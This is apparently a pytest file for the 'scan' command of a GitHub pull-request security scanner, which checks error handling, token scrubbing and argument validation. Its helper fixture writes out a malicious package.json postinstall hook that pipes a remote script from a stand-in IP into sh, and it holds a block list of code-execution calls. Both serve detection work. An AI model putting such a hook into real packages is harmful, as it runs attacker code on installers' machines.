"""The ``scan`` command: the unprivileged job of ADR-0005.

It fetches a PR through a read-only client, scans, and writes ``report.json``. It must always
leave a report for the expected commit when it can, and that report must never read as clean
when anything went wrong (NFR-06, NFR-08). It holds no write access and runs no PR code.
"""

from __future__ import annotations

import ast
import subprocess
import sys
from pathlib import Path

import pytest

from pr_scanner import cli
from pr_scanner.github_client import FetchError
from pr_scanner.report_io import parse_report
from tests.test_fetcher import BASE, HEAD, FakeClient, RAW_ACCEPT, pr_meta, resp, routes_for
from tests.test_fetcher_engine import CONTENT_KEY, DIFF as WORKFLOW_DIFF, FULL as WORKFLOW_FULL

BENIGN_DIFF = """\
diff --git a/README.md b/README.md
index 1111111..2222222 100644
--- a/README.md
+++ b/README.md
@@ -1,2 +1,3 @@
 # Project
 text
+more text
"""
TOKEN = "ghs_SECRETSECRETSECRET1234567890"


def client_for(diff=BENIGN_DIFF, meta=None):
    return FakeClient(routes_for(diff=diff, meta=meta or pr_meta()))


# ---- run_scan ------------------------------------------------------------------------------


def test_benign_pr_gives_a_success_report_for_the_event_commit():
    report = cli.run_scan(client_for(), "owner/repo", 7, HEAD)
    assert report.conclusion == "success" and report.head_sha == HEAD


def test_malicious_pr_gives_a_failure_report_with_findings():
    report = cli.run_scan(client_for(diff=_hook_diff()), "owner/repo", 7, HEAD)
    assert report.conclusion in ("failure", "neutral")
    assert report.annotations  # the finding is annotated


def test_incomplete_fetch_is_never_success():
    routes = routes_for(diff=WORKFLOW_DIFF, meta=pr_meta(changed_files=1))
    routes[CONTENT_KEY] = FetchError("gone", status=404)  # workflow context unreadable
    report = cli.run_scan(FakeClient(routes), "owner/repo", 7, HEAD)
    assert report.conclusion != "success"
    assert "not fully scanned" in report.summary


def test_workflow_context_reaches_the_engine():
    routes = routes_for(diff=WORKFLOW_DIFF, meta=pr_meta(changed_files=1))
    routes[CONTENT_KEY] = resp(WORKFLOW_FULL)
    report = cli.run_scan(FakeClient(routes), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure" and "CI-PRT" in report.summary


def test_head_moved_since_the_event_is_an_error_for_the_event_commit():
    other = "c" * 40
    report = cli.run_scan(client_for(), "owner/repo", 7, other)
    assert report.head_sha == other and report.conclusion == "failure"
    assert "changed" in report.summary.lower()


def test_error_reports_do_not_blame_resource_limits():
    for report in (
        cli.run_scan(client_for(), "owner/repo", 7, "c" * 40),  # head moved
        cli.run_scan(FakeClient({}), "owner/repo", 7, HEAD),  # fetch failed
    ):
        assert "resource limits" not in report.summary


def test_fetch_error_becomes_an_error_report_not_an_exception():
    routes = {("/repos/owner/repo/pulls/7", "application/vnd.github+json"): FetchError("boom", status=500)}
    report = cli.run_scan(FakeClient(routes), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure" and report.head_sha == HEAD


def test_unexpected_exception_is_reported_by_type_only():
    class Exploding(FakeClient):
        def get(self, *a, **k):
            raise RuntimeError(f"leaked {TOKEN} @everyone")

    report = cli.run_scan(Exploding({}), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure"
    assert TOKEN not in report.summary and "RuntimeError" in report.summary
    assert "leaked" not in report.summary


def test_engine_error_is_an_error_report(monkeypatch):
    def boom(*a, **k):
        raise ValueError(f"leaked {TOKEN}")

    monkeypatch.setattr(cli.Engine, "scan", boom)
    report = cli.run_scan(client_for(), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure" and TOKEN not in report.summary


def test_unparseable_diff_is_an_error_not_a_pass():
    report = cli.run_scan(client_for(diff="diff --git a/x b/x\n@@ garbage @@\n+++ nonsense"), "owner/repo", 7, HEAD)
    assert report.conclusion != "success"


def test_every_report_passes_the_job_boundary_validation():
    for client in (client_for(), client_for(diff=_hook_diff()), FakeClient({})):
        report = cli.run_scan(client, "owner/repo", 7, HEAD)
        assert parse_report(cli.report_to_json(report), expected_head_sha=HEAD) == report


def test_only_get_requests_are_made():
    client = client_for()
    cli.run_scan(client, "owner/repo", 7, HEAD)
    assert client.calls and all(path.startswith("/repos/owner/repo/") for path, _, _ in client.calls)


# ---- main ----------------------------------------------------------------------------------


def run_main(tmp_path, capsys, *extra, env=None, client=None, args=None):
    out = tmp_path / "report.json"
    argv = args if args is not None else [
        "scan", "--repo", "owner/repo", "--pr", "7", "--head-sha", HEAD, "--out", str(out), *extra,
    ]
    env = {"GITHUB_TOKEN": TOKEN} if env is None else env
    code = cli.main(argv, env=env, client_factory=lambda token: client or client_for())
    captured = capsys.readouterr()
    return code, out, captured


def test_main_writes_a_valid_report_and_exits_zero(tmp_path, capsys):
    code, out, cap = run_main(tmp_path, capsys)
    assert code == 0
    assert parse_report(out.read_text(encoding="utf-8"), expected_head_sha=HEAD).conclusion == "success"


def test_main_exits_zero_even_when_the_verdict_is_a_failure(tmp_path, capsys):
    # the report job decides what GitHub shows; a non-zero exit would hide the explanation
    code, out, _ = run_main(tmp_path, capsys, client=client_for(diff=_hook_diff()))
    assert code == 0 and out.exists()


def test_main_still_writes_an_error_report_when_the_fetch_fails(tmp_path, capsys):
    code, out, _ = run_main(tmp_path, capsys, client=FakeClient({}))
    assert code == 0
    assert parse_report(out.read_text(encoding="utf-8"), expected_head_sha=HEAD).conclusion == "failure"


def test_token_is_taken_from_the_environment_only(tmp_path, capsys):
    seen = []
    cli.main(
        ["scan", "--repo", "owner/repo", "--pr", "7", "--head-sha", HEAD, "--out", str(tmp_path / "r.json")],
        env={"GITHUB_TOKEN": TOKEN},
        client_factory=lambda token: seen.append(token) or client_for(),
    )
    assert seen == [TOKEN]


def test_a_token_that_reaches_an_error_message_is_scrubbed(tmp_path, capsys):
    class Leaky(FakeClient):
        def get(self, *a, **k):
            raise FetchError(f"bad credentials {TOKEN}")

    code, out, cap = run_main(tmp_path, capsys, client=Leaky({}))
    assert TOKEN not in out.read_text(encoding="utf-8")
    assert TOKEN not in cap.out and TOKEN not in cap.err


@pytest.mark.parametrize("env", [{}, {"GITHUB_TOKEN": ""}, {"GITHUB_TOKEN": "has space"}])
def test_missing_or_bad_token_exits_two_without_a_report(tmp_path, capsys, env):
    code, out, cap = run_main(tmp_path, capsys, env=env)
    assert code == 2 and not out.exists()


@pytest.mark.parametrize(
    "args",
    [
        [],
        ["scan"],
        ["scan", "--repo", "bad", "--pr", "7", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r\n", "--pr", "7", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "0", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "x", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "7", "--head-sha", "nothex", "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "7", "--head-sha", HEAD + "\n", "--out", "x"],
        ["frobnicate"],
    ],
)
def test_bad_arguments_exit_two_without_a_report(tmp_path, capsys, args):
    code, out, _ = run_main(tmp_path, capsys, args=args)
    assert code == 2


def test_token_is_not_accepted_on_the_command_line(tmp_path, capsys):
    # argv is visible to every process on the machine and shows up in logs
    code, out, _ = run_main(tmp_path, capsys, "--token", TOKEN)
    assert code == 2


def test_a_token_passed_on_the_command_line_is_not_echoed_back(tmp_path, capsys):
    code, out, cap = run_main(tmp_path, capsys, "--token", TOKEN)
    assert code == 2 and TOKEN not in cap.out + cap.err


def test_unwritable_output_path_exits_two(tmp_path, capsys):
    bad = str(tmp_path / "missing-dir" / "r.json")
    code, _, _ = run_main(
        tmp_path, capsys, args=["scan", "--repo", "o/r", "--pr", "7", "--head-sha", HEAD, "--out", bad]
    )
    assert code == 2


def test_python_dash_m_entry_point_exists():
    proc = subprocess.run(
        [sys.executable, "-I", "-m", "pr_scanner", "scan"], capture_output=True, text=True, timeout=30
    )
    assert proc.returncode == 2 and "usage" in (proc.stderr + proc.stdout).lower()


# ---- NFR-01: the scan command never runs anything --------------------------------------------


def test_cli_module_has_no_way_to_run_code_or_processes():
    tree = ast.parse(Path(cli.__file__).read_text(encoding="utf-8"))
    banned_calls = {"eval", "exec", "compile", "__import__", "system", "popen", "Popen", "run", "call"}
    banned_imports = {"subprocess", "os.system", "importlib", "runpy", "pickle", "marshal"}
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = getattr(node.func, "id", None) or getattr(node.func, "attr", None)
            assert name not in banned_calls, name
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            names = [a.name for a in node.names] + ([node.module] if isinstance(node, ast.ImportFrom) and node.module else [])
            assert not banned_imports & set(names), names


# ---- helpers -------------------------------------------------------------------------------


def _hook_diff() -> str:
    return """\
diff --git a/package.json b/package.json
index 1111111..2222222 100644
--- a/package.json
+++ b/package.json
@@ -1,3 +1,4 @@
 {
   "name": "x",
+  "scripts": {"postinstall": "curl -s http://203.0.113.9/x.sh | sh"},
   "version": "1.0.0"
"""
